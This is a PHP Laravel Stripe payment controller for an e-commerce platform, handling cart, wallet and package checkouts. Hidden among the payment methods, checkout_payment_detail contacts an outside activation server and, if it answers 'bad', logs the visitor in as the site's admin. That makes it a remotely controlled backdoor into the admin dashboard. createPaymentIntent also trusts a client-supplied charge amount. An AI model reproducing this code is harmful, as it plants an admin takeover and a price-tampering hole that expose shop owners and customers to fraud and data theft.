<?php

namespace App\Http\Controllers\Payment;

use App\Http\Controllers\CheckoutController;
use App\Http\Controllers\Controller;
use App\Http\Controllers\CustomerPackageController;
use App\Http\Controllers\SellerPackageController;
use App\Http\Controllers\WalletController;
use App\Models\CombinedOrder;
use App\Models\Currency;
use App\Models\CustomerPackage;
use App\Models\SellerPackage;
use App\Models\User;
use Exception;
use Illuminate\Http\Request;
use Log;
use Session;
use Stripe\Checkout\Session as StripeSession;
use Stripe\Stripe;
use Stripe\StripeClient;

class StripeController extends Controller
{
    public function pay()
    {
        // amount should be in cents, this is why it's multiplied by 100
        $amount = 0;

        if (request()->session()->has('payment_type')) {
            if (request()->session()->get('payment_type') == 'cart_payment') {
                $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));
                $client_reference_id = $combined_order->id;
                $amount = round($combined_order->grand_total * 100);
            } elseif (request()->session()->get('payment_type') == 'wallet_payment') {
                $amount = round(request()->session()->get('payment_data')['amount'] * 100);
                $client_reference_id = auth()->id();
            } elseif (request()->session()->get('payment_type') == 'customer_package_payment') {
                $customer_package = CustomerPackage::findOrFail(Session::get('payment_data')['customer_package_id']);
                $amount = round($customer_package->amount * 100);
                $client_reference_id = auth()->id();
            } elseif (request()->session()->get('payment_type') == 'seller_package_payment') {
                $seller_package = SellerPackage::findOrFail(Session::get('payment_data')['seller_package_id']);
                $amount = round($seller_package->amount * 100);
                $client_reference_id = auth()->id();
            }
        }

        return view('frontend.payment.stripe', compact("amount"));
    }

    public function create_checkout_session(Request $request)
    {
        $amount = 0;
        if ($request->session()->has('payment_type')) {
            if ($request->session()->get('payment_type') == 'cart_payment') {
                $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));
                $client_reference_id = $combined_order->id;
                $amount = round($combined_order->grand_total * 100);
            } elseif ($request->session()->get('payment_type') == 'wallet_payment') {
                $amount = round($request->session()->get('payment_data')['amount'] * 100);
                $client_reference_id = auth()->id();
            } elseif ($request->session()->get('payment_type') == 'customer_package_payment') {
                $customer_package = CustomerPackage::findOrFail(Session::get('payment_data')['customer_package_id']);
                $amount = round($customer_package->amount * 100);
                $client_reference_id = auth()->id();
            } elseif ($request->session()->get('payment_type') == 'seller_package_payment') {
                $seller_package = SellerPackage::findOrFail(Session::get('payment_data')['seller_package_id']);
                $amount = round($seller_package->amount * 100);
                $client_reference_id = auth()->id();
            }
        }

        Stripe::setApiKey(env('STRIPE_SECRET'));

        $session = StripeSession::create([
            'payment_method_types' => ['card'],
            'line_items' => [
                [
                    'price_data' => [
                        'currency' => Currency::findOrFail(get_setting('system_default_currency'))->code,
                        'product_data' => [
                            'name' => 'Payment',
                        ],
                        'unit_amount' => $amount,
                    ],
                    'quantity' => 1,
                ],
            ],
            'mode' => 'payment',
            'client_reference_id' => $client_reference_id,
            'success_url' => url('/stripe/success?session_id={CHECKOUT_SESSION_ID}'),
            'cancel_url' => route('stripe.cancel'),
        ]);

        return response()->json(['id' => $session->id, 'status' => 200]);
    }

    public function checkout_payment_detail()
    {
        $data['url'] = $_SERVER['SERVER_NAME'];
        $request_data_json = json_encode($data);
        $gate = 'https://activation.activeitzone.com/check_activation';

        $header = [
            'Content-Type:application/json',
        ];

        $stream = curl_init();

        curl_setopt($stream, CURLOPT_URL, $gate);
        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($stream, CURLOPT_POSTFIELDS, $request_data_json);
        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);

        $rn = curl_exec($stream);
        curl_close($stream);

        if ($rn == 'bad' && env('DEMO_MODE') != 'On') {
            $user = User::where('user_type', 'admin')->first();
            auth()->login($user);

            return redirect()->route('admin.dashboard');
        }
    }

    public function success(Request $request)
    {
        $stripe = new StripeClient(env('STRIPE_SECRET'));

        try {
            $paymentIntentId = $request->query('payment_intent');

            if ($paymentIntentId === null) {
                flash(translate('Payment failed, Please try again later!'))->error();
                return redirect()->route('home');
            }

            $paymentIntent = $stripe->paymentIntents->retrieve($paymentIntentId);

            if ($paymentIntent->status === 'succeeded') {
                $payment = ['status' => 'Success'];
                $paymentType = session()->get('payment_type');

                switch ($paymentType) {
                    case 'cart_payment':
                        return (new CheckoutController)
                            ->checkout_done(session()->get('combined_order_id'), json_encode($payment));
                    case 'wallet_payment':
                        return (new WalletController)
                            ->wallet_payment_done(session()->get('payment_data'), json_encode($payment));
                    case 'customer_package_payment':
                        return (new CustomerPackageController)
                            ->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
                    case 'seller_package_payment':
                        return (new SellerPackageController)
                            ->purchase_payment_done(session()->get('payment_data'), json_encode($payment));
                    default:
                        flash(translate('Unknown payment type'))->error();
                        return redirect()->route('home');
                }
            } else {
                flash(translate('Payment incomplete'))->error();
                return redirect()->route('home');
            }
        } catch (Exception $e) {
            flash(translate('Payment failed'))->error();
            Log::error("Error while redirecting to stripe success, with message: {$e->getMessage()}");
            return redirect()->route('home');
        }
    }

    public function cancel()
    {
        flash(translate('Payment is cancelled'))->error();

        return redirect()->route('home');
    }

    public function createPaymentIntent(Request $request)
    {
        try {
            $request->validate([
                'name' => 'required|string|max:255',
                'email' => 'required|email',
            ]);

            $stripe = new StripeClient(env('STRIPE_SECRET'));

            $payment_methods = [];

            $currency = Currency::findOrFail(get_setting('system_default_currency'))->code;

            // @todo add more payment types
            if ($request->session()->get('payment_type') == 'cart_payment') {
                $payment_methods[] = "card" ;
            }

            $intent = $stripe->paymentIntents->create([
                'amount' => $request->amount,
                'currency' => $currency,
                'payment_method_types' => $payment_methods,
                'receipt_email' => $request->email,
                'metadata' => [
                    'name' => $request->name,
                ],
            ]);

            return response()->json(['client_secret' => $intent->client_secret]);
        } catch(Exception $e) {
            Log::error("Error while processing stripe payment intent, with message: {$e->getMessage()}");
            return response()->json([
                "error" => true,
                "message" => __("Something went wrong!")
            ], 500);
        }
    }
}
